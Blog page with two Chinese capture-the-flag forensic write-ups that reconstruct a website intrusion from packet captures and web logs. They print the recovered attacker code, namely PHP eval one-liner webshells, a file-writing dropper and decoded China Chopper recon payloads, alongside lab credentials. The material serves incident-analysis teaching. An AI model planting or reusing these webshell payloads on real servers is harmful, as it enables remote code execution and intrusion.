<!DOCTYPE html><html><head><meta charset="utf-8"><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><title>daiker&#39;s blog</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta property="og:type" content="website"><meta property="og:title" content="daiker&#39;s blog"><meta property="og:url" content="https://www.daikersec.com/index.html"><meta property="og:site_name" content="daiker&#39;s blog"><meta property="og:locale" content="zh-Hans"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="daiker&#39;s blog"><link rel="alternative" href="/atom.xml" title="daiker&#39;s blog" type="application/atom+xml"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/style.css"><!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]--></head></html><body><div id="container"><div id="wrap"><header id="header"><div id="banner"></div><div id="header-outer" class="outer"><div id="header-title" class="inner"><h1 id="logo-wrap"><a href="/" id="logo">daiker&#39;s blog</a></h1></div><div id="header-inner" class="inner"><nav id="main-nav"><a id="main-nav-toggle" class="nav-icon"></a> <a class="main-nav-link" href="/">Home</a> <a class="main-nav-link" href="/archives">Archives</a></nav><nav id="sub-nav"><a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a> <a id="nav-search-btn" class="nav-icon" title="Search"></a></nav><div id="search-form-wrap"><form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form"><input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search"> <input type="submit" class="search-form-submit"> <input name="tn" type="hidden" value="bds"> <input name="cl" type="hidden" value="3"> <input name="ct" type="hidden" value="2097152"> <input type="hidden" name="si" value="www.daikersec.com"></form></div></div></div></header><div class="outer"><section id="main"><article id="post-铁人三项2018第七赛区-福建-数据赛wp" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/post/ba9a968.html" class="article-date"><time datetime="2018-05-15T13:44:37.000Z" itemprop="datePublished">2018-05-15</time></a><div class="article-category"><a class="article-category-link" href="/categories/数据分析/">数据分析</a></div></div><div class="article-inner"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/post/ba9a968.html">铁人三项2018第七赛区(福建)数据赛wp</a></h1></header><div class="article-entry" itemprop="articleBody"><h1 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h1><p>链接:<a href="https://pan.baidu.com/s/109nbU4x0t-IXHaP_vBLuaw" target="_blank" rel="noopener">密码：0ple</a><br>题目:<img src="https://upload-images.jianshu.io/upload_images/5443560-b09dd03db6a4a0e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-f7b684d9bcd35079.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-9152af76dbbe7ac6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-1785e9120c4b401a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h1 id="0x01-写webshell"><a href="#0x01-写webshell" class="headerlink" title="0x01 写webshell"></a>0x01 写webshell</h1><p>先通过httppcap 提取出http浏览<br>脚本如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for file in `ls`</span><br><span class="line">do</span><br><span class="line">    parse_pcap -vvv $file &gt; content/$file.txt</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p></p><p><img src="https://upload-images.jianshu.io/upload_images/5443560-f3ac4605b2b46b38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>第一关是<code>关卡描述：网站后台密码是多少</code><br>这里制作一个匹配脚本，后面用的到<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for file in `ls`</span><br><span class="line">do</span><br><span class="line">    echo $file</span><br><span class="line">    cat $file|grep $1</span><br><span class="line">    echo &quot;-----------------------------------------------------&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p></p><p>执行<code>./1.sh pass</code><br>发现大量爆破<br><img src="https://upload-images.jianshu.io/upload_images/5443560-75b68180138f35c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>接下来匹配<code>./1.sh &quot;&amp;password=&quot;</code><br>尝试下查看下最后一个爆破的回包<code>username=admin&amp;password=aabbcc</code><br>在<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c083326bfd6e0884.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>结合<code>302</code>，<code>location</code>，<code>set-Cookie</code>可以看出这个已经爆破成功，所以第一题<code>关卡描述：网站后台密码是多少</code>是<code>aabbcc</code>。攻击者IP是<code>202.1.1.2</code>。<br>接下来看第三题。<code>网站后台登陆地址是多少（http://+ip+路径）</code><br>找到一个爆破的包，有这么几行<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[202.1.1.2:15717] -- -- --&gt; [192.168.1.203:80] </span><br><span class="line">POST /ad_admin.php?mod=login HTTP/1.1</span><br><span class="line">Host: 202.1.1.1</span><br></pre></td></tr></table></figure><p></p><p>我就填了<code>http://202.1.1.1/ad_admin.php</code>结果不行，后来填了<br><code>http://192.168.1.203/ad_admin.php</code>，答案正确，我觉得应该是第一个更贴切。<br>接下来的问题是找<code>webshell</code>。我通过匹配菜刀连接特征寻找猜到痕迹。<br><img src="https://upload-images.jianshu.io/upload_images/5443560-fa3c58ad953c5501.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>在<code>data-sence2_00003_20180204180642.pcapng.txt</code>里面,向前看，在第一个<code>shell2.php</code>前面，爆破成功后面<br>找到这句话<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c58ca9fe78481fce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>解码得到<br><code>$fp = fopen(&quot;shell2.php&quot;, &quot;w&quot;);fwrite($fp, &quot;&lt;?php eval(\$_POST[&#39;cmd&#39;]);?&gt;&quot;);fclose($fp);</code><br>所以webshell的内容是<br><code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>接下来从第五题开始分析的是菜刀里面的内容</p><h1 id="0x03-webshell"><a href="#0x03-webshell" class="headerlink" title="0x03 webshell"></a>0x03 webshell</h1><p><code>5. 关卡描述：网站数据库密码是多少</code><br>在<code>data-sence2_00007_20180204183072.pcapng.txt</code>里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-0eee457199c56056.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>所以密码是<code>newnrtpassword</code><br><code>6. 黑客第一个上传的php文件名是什么</code><br>在<code>data-sence2_00005_20180204181416.pcapng</code>里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-9d42f1f49c600c49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>解码为<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&apos;5.3.0&apos;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$f=&apos;/var/www/html/diypage/scan.php&apos;;$c=$_POST[&quot;z1&quot;];$c=str_replace(&quot;\r&quot;,&quot;&quot;,$c);$c=str_replace(&quot;\n&quot;,&quot;&quot;,$c);$buf=&quot;&quot;;for($i=0;$i&lt;strlen($c);$i+=2)$buf.=urldecode(&apos;%&apos;.substr($c,$i,2));echo(@fwrite(fopen($f,&apos;w&apos;),$buf)?&apos;1&apos;:&apos;0&apos;);;echo(&quot;X@Y&quot;);die();</span><br></pre></td></tr></table></figure><p></p><p>所以结果为<code>scan.php</code><br><code>7. 关卡描述：黑客对内网扫描的范围是多少(ip1-ip2)</code><br>结合上面的<code>scan.php</code>，应该是通过scan.php来匹配的。我们匹配下<br><code>./1.sh scan.php</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-ab03c1a646f06531.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>在<code>data-sence2_00005_20180204181416.pcapng</code>里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-b9f384e7f0c4084b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>是从<code>192.168.2.1</code>到<code>192.168.2.150</code><br><code>8. 描述：黑客下载的数据库备份文件名是什么</code><br>匹配<code>./1.sh bak</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-0c3449dc2554f7c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>所以是<code>bak_2018-01-29-17-47-52.zip</code><br><code>9. 关卡描述：黑客上传的图片木马的密码是多少</code><br>用<code>./1.sh &#39;array_map(&quot;ass&quot;.&quot;ert&quot;,array&#39;</code>匹配菜刀内容，图片应该post的包是蛮大的。总共比较大的就几个。然后一个个解码，根据文件名，找到<code>favicon.ico&#39;</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-00b33027f7750edc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>在<code>data-sence2_00007_20180204183702.pcapng</code>里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a639984bfb7a3999.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>拖进winhex<br><img src="https://upload-images.jianshu.io/upload_images/5443560-02121bc64f3566d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>所以图片马的密码是 <code>picto</code><br><code>10. 黑客修改了哪个文件来配合木马文件(绝对路径)</code><br>上面传的是图片马，不能直接利用，要配合使用，应该 是利用文件包含<br>先过滤菜刀，再过滤include<br><code>./1.sh &#39;array_map(&quot;ass&quot;.&quot;ert&quot;,array&#39;|grep include</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-aaac5eb8698492d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>在这里面看到<code>include%28..%2Ffavicon.ico</code><br>解码，得到文件名为<code>/var/www/html/diypage/adm/obj_edit.php</code><br>接下来的操作都是通过tunnel代理</p><h1 id="0x04-web代理"><a href="#0x04-web代理" class="headerlink" title="0x04 web代理"></a>0x04 web代理</h1><p><code>11 关卡描述：FTP服务器开在了哪个端口</code><br><code>reGeorg</code>这个工具常用于web代理，查找端口我们可以直接利用<br><code>./1.sh &#39;?cmd=connect&amp;target=&#39;</code>过滤，查找到有<br><code>1433</code>，<code>10062</code>，<code>10063</code>三个端口，我们一个个过滤(比赛的时候懒得过滤，有5次提交机会，所以一个个试，是1433).通过wireshark<br>过滤<code>tcp.port == 1433 || udp.port == 1433</code><br>追踪流可以看到ftp登录，因此就是他了<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c105bd4442dd2e2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><code>12 黑客使用FTP上传的文件名</code><br>追踪1433的流，发现大量登录爆破，在成功的那个流里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-40dbb31a9fa3f4a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>文件名是<code>readmd.rtf</code><br><code>13 黑客登陆FTP的密码是多少</code><br>也是在这个流里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8805e68ac70138c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>密码是<code>qweasd123!@#</code><br><code>14. 黑客使用FTP上传的文件中的文件内容是什么</code><br>在这个<img src="https://upload-images.jianshu.io/upload_images/5443560-9da6c2e8697396a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">的中间寻找流，刚好在226上面那条<br><img src="https://upload-images.jianshu.io/upload_images/5443560-0afe48938d69421f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p></div><footer class="article-footer"><a data-url="https://www.daikersec.com/post/ba9a968.html" data-id="cjh7qn8jk0014vdxv368m6vu0" class="article-share-link" data-share="baidu" data-title="铁人三项2018第七赛区(福建)数据赛wp">分享到</a><ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wireshark/">wireshark</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/取证/">取证</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/数据分析/">数据分析</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日志分析/">日志分析</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/流量分析/">流量分析</a></li></ul></footer></div></article><article id="post-铁人三项数据赛样题分析" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/post/3c7f43ba.html" class="article-date"><time datetime="2018-04-22T14:30:02.000Z" itemprop="datePublished">2018-04-22</time></a><div class="article-category"><a class="article-category-link" href="/categories/数据分析/">数据分析</a></div></div><div class="article-inner"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/post/3c7f43ba.html">铁人三项数据赛样题分析</a></h1></header><div class="article-entry" itemprop="articleBody"><h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><p>下载链接: <a href="https://pan.baidu.com/s/1bq9Zvun" target="_blank" rel="noopener">数据赛 密码：wabt 解压密码：t3sectimu</a><br>题目要求:<br>背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。<br>问题：</p><p>（1）黑客最终获得了什么用户名<br>（2）黑客最终获得了什么密码<br>（3）黑客修改了什么文件<br>（4）黑客使用菜刀的完整连接地址<br>（5）黑客使用菜刀的连接密码<br>(6)黑客的查看的第一个文件目录是什么</p><h2 id="0x01-初步分析攻击者IP"><a href="#0x01-初步分析攻击者IP" class="headerlink" title="0x01 初步分析攻击者IP"></a>0x01 初步分析攻击者IP</h2><p>我们在假定攻击者攻击成功的情况下，应该会留下网页木马，先看下最后一个被访问的那些链接，这里通过<code>Web Log Explorer</code>的<code>Exit Point</code>查看<br><img src="https://upload-images.jianshu.io/upload_images/5443560-48d9b8b43b9db3a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Exit Point"><br>这里看到三个比较可疑的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tunnel.php</span><br><span class="line">backdoor.php</span><br><span class="line">y0n.php</span><br></pre></td></tr></table></figure><p>然后看三个中最早的具体保文，可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.61.210 (LOCAL NETWORK)   2016/8/10 1:16:07   /y0n.php            200 - OK    No Referrer</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.61.210 (LOCAL NETWORK)   2016/8/10 1:15:38   /backdoor.php           200 - OK    No Referrer</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101.36.79.67 (Beijing,Beijing,China)    2016/8/10 1:03:07   /tunnel.php     28  200 - OK    No Referrer</span><br></pre></td></tr></table></figure><p>这里面的/tunnel.php，如果我们做过内网渗透的时候应该都知道，这个是一个HTTP代理，我们又注意到<code>backdoor.php</code>和<code>y0n.php</code>的访问IP都是内网，再看下访问时间，可以推出攻击者是通过tunnul代理进来的。攻击者IP大致可以确定是<code>101.36.79.67</code>。现在已经的最早攻击成功时间是<code>2016/8/10 1:03:07</code>.这个情况下分析下<code>101.36.79.67</code>这个IP的访问记录。我们通过<code>Apache Logs Viewer</code>来过滤IP。分析攻击过程<img src="https://upload-images.jianshu.io/upload_images/5443560-8c96560e500388bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="访问情况.png"><br>这里面没发现有啥能getshell的操作。<br>这条思路断了。</p><h2 id="0x02-再分析攻击者IP"><a href="#0x02-再分析攻击者IP" class="headerlink" title="0x02 再分析攻击者IP"></a>0x02 再分析攻击者IP</h2><p>接下来通过单个页面的点击情况来分析(正常首页那种情况访问量应该多，，后台的访问应该比较少)<br><img src="https://upload-images.jianshu.io/upload_images/5443560-16cba6bf852c872c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="点击情况.png"><br>然后这里陷入一个惯性思维，，以为index.php一定是首页。点进去才看到<code>index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=xFbuB1</code>这样的链接，想起来这是用<code>MVC</code>书写的时候的链接上次。点进<code>index.php</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-5ee3414ee6efc313.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="后台.png"><br>这里发现大量对后台进行访问，，初步推测可能在爆破账号密码。对IP进行过滤，排除掉内网IP，得到<code>219.239.105.18</code>这个IP</p><h2 id="0x03-分析攻击过程"><a href="#0x03-分析攻击过程" class="headerlink" title="0x03 分析攻击过程"></a>0x03 分析攻击过程</h2><p>我们通过<code>Apache Logs Viewer</code>来过滤IP<br><img src="https://upload-images.jianshu.io/upload_images/5443560-fcf0ea076111ce51.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆破.png"><br>我们分析该IP大约从2016/8/9 22:17分开始进行爆破(后台，发送大量POST包可以推断出来)，然后我们往后看<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8f4ee70a317bd267.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="成功.png"><br>大约在 2016/8/9 23:02 爆破成功<br>接下来我们看到<br><img src="https://upload-images.jianshu.io/upload_images/5443560-44eef6cf318db78d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="edit.png"><br>这里使用模板的editFile,修改的search 的index.html。<br>然后后面通过POST访问search这个，模块，，初步推测，，这里是种马和访问马的过程。这里单纯看日志有个不好的地方，，就是看不到POST的body里面的内容，这个时候就得结合流量包。</p><h2 id="0x04-分析攻击流量"><a href="#0x04-分析攻击流量" class="headerlink" title="0x04 分析攻击流量"></a>0x04 分析攻击流量</h2><p>我们通过流量包来验证上面日志的分析</p><h4 id="分析爆破出来的账号密码"><a href="#分析爆破出来的账号密码" class="headerlink" title="分析爆破出来的账号密码"></a>分析爆破出来的账号密码</h4><p>如果直接用wireshark一个个打开，太大了。这里推荐个软件 httppcap 专门用来提取http数据包的。总共有8个流量包，，如果一个个分析的话太繁琐，我们先大约估计爆破的在哪几个包里面。<br>通过一下shell脚本，提取每个包里面来自<code>219.239.105.18</code>的http请求头部<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for file in `ls`</span><br><span class="line">do</span><br><span class="line">    parse-pcap -i 219.239.105.18 $file &gt;&gt; txt/$file.txt</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p></p><p>然后匹配哪些包里面含有<code>m=index</code>这样的请求<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for file in `ls`</span><br><span class="line">do</span><br><span class="line">    echo $file</span><br><span class="line">    cat $file|grep &apos;/index.php?m=admin&apos; </span><br><span class="line">    echo &quot;-----------------------------------------------------&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p></p><p>得到爆破的流量都在<code>数据采集D_eth0_NS_20160810_130801.pcap</code>这个文件里面<br>接下来使用<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse-pcap -i 219.239.105.18 -vvv 数据采集D_eth0_NS_20160810_130801.pcap &gt; txt/all.txt</span><br></pre></td></tr></table></figure><p></p><p>来查看所有的爆破时候的http具体报文<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c64aa09ab58193f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆破报文.png"><br>如图,爆破的数据包在里面，，接下来寻找爆破成功的那个<br>根据发包时间和回包大小我们确实了登录成功的账号为<code>root</code>，密码为<code>123456</code>。<br><img src="https://upload-images.jianshu.io/upload_images/5443560-2ac5a6358ca9286d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="深度截图_选择区域_20180417222225.png"></p><h4 id="0x02-分析一句话"><a href="#0x02-分析一句话" class="headerlink" title="0x02 分析一句话"></a>0x02 分析一句话</h4><p>通过上面方法匹配<code>m=search</code>,得到报文在<br><code>数据采集D_eth0_NS_20160810_141903.pcap</code>,<code>数据采集D_eth0_NS_20160810_142037.pcap</code>,<code>数据采集D_eth0_NS_20160810_142224.pcap</code>里面<br>然后提取报文详情<br><img src="https://upload-images.jianshu.io/upload_images/5443560-ff94f72c1e380db7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="yijuhua.png"><br>熟悉的一句话,urldecode一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chopper=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure><p>密码为chooper</p><p><img src="https://upload-images.jianshu.io/upload_images/5443560-3d8671f934c615cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="深度截图_选择区域_20180417223950.png"><br>第一个目录是/var/www/html</p><h4 id="0x03-一句话操作分析"><a href="#0x03-一句话操作分析" class="headerlink" title="0x03 一句话操作分析"></a>0x03 一句话操作分析</h4><p>总共有15个一句话操作<br>第一个解码完就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"-&gt;|"</span>);</span><br><span class="line">$D = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line"><span class="keyword">if</span> ($D == <span class="string">""</span>) $D = dirname($_SERVER[<span class="string">"PATH_TRANSLATED"</span>]);</span><br><span class="line">$R = <span class="string">"&#123;$D&#125;\t"</span>;<span class="keyword">if</span> (substr($D, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">"/"</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (range(<span class="string">"A"</span>, <span class="string">"Z"</span>) <span class="keyword">as</span> $L)</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="string">"&#123;$L&#125;:"</span>))</span><br><span class="line">            $R .= <span class="string">"&#123;$L&#125;:"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$R .= <span class="string">"\t"</span>;</span><br><span class="line">$u = (function_exists(<span class="string">'posix_getegid'</span>)) ? @posix_getpwuid(@posix_geteuid()) : <span class="string">''</span>;$usr = ($u) ? $u[<span class="string">'name'</span>] : @get_current_user();$R .= php_uname();$R .= <span class="string">"(&#123;$usr&#125;)"</span>;<span class="keyword">print</span> $R;;<span class="keyword">echo</span>(<span class="string">"|&lt;-"</span>);<span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个脚本的作用是获取网页所在的绝对路径<br>接下来依次分析，分别是<br>查看 /var/www/html 目录底下的文件内容<br>有这些</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">caches/ 2016-08-04 10:40:44 4096    0777</span><br><span class="line">uploadfile/ 2016-08-04 11:01:20 4096    0777</span><br><span class="line">statics/    2016-08-04 10:38:16 4096    0777</span><br><span class="line">api/    2016-08-04 10:38:16 4096    0777</span><br><span class="line">../ 2016-08-04 10:37:16 4096    0755</span><br><span class="line">phpsso_server/  2016-08-04 10:38:16 4096    0777</span><br><span class="line">html/   2016-08-04 10:46:37 4096    0777</span><br><span class="line">./  2016-08-04 10:39:54 4096    0777</span><br><span class="line">phpcms/ 2016-08-04 10:38:16 4096    0777</span><br><span class="line">plugin.php  2016-08-04 10:38:16 3573    0777</span><br><span class="line">index.html  2016-08-04 11:55:19 17588   0777</span><br><span class="line">crossdomain.xml 2016-08-04 10:38:16 104 0777</span><br><span class="line">robots.txt  2016-08-04 10:38:16 170 0777</span><br><span class="line">admin.php   2016-08-04 10:38:16 48  0777</span><br><span class="line">api.php 2016-08-04 10:38:16 595 0777</span><br><span class="line">index.php   2016-08-04 10:38:16 318 0777</span><br><span class="line">js.html 2016-08-04 10:38:16 523 0777</span><br><span class="line">favicon.ico 2016-08-04 10:38:16 3158    0777</span><br></pre></td></tr></table></figure><p>接下来查看的是根目录底下的文件夹,有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var/    2016-07-22 19:50:16 4096    0755</span><br><span class="line">selinux/    2016-07-16 00:59:51 0   0755</span><br><span class="line">lib/    2016-07-11 23:51:40 4096    0555</span><br><span class="line">dev/    2016-07-16 01:01:30 3740    0755</span><br><span class="line">media/  2016-07-12 00:18:35 4096    0755</span><br><span class="line">usr/    2016-07-11 23:46:08 4096    0755</span><br><span class="line">tmp/    2016-08-09 18:16:02 4096    1777</span><br><span class="line">etc/    2016-08-09 18:16:11 12288   0755</span><br><span class="line">proc/   2016-07-16 00:59:50 0   0555</span><br><span class="line">bin/    2016-07-16 02:18:03 4096    0555</span><br><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">home/   2016-08-04 10:23:14 4096    0755</span><br><span class="line">srv/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">opt/    2016-07-12 00:03:18 4096    0755</span><br><span class="line">sbin/   2016-07-16 02:18:04 12288   0555</span><br><span class="line">data1/  2016-07-12 00:11:00 4096    0755</span><br><span class="line">./  2016-07-16 01:00:10 4096    0555</span><br><span class="line">mnt/    2016-07-12 00:01:13 4096    0755</span><br><span class="line">sys/    2016-07-16 00:59:50 0   0755</span><br><span class="line">lib64/  2016-07-16 02:17:51 12288   0555</span><br><span class="line">boot    1970-01-01 08:00:00     0</span><br><span class="line">root    1970-01-01 08:00:00     0</span><br><span class="line">.autofsck   2016-07-16 01:00:10 0   0644</span><br><span class="line">lost+found  1970-01-01 08:00:00     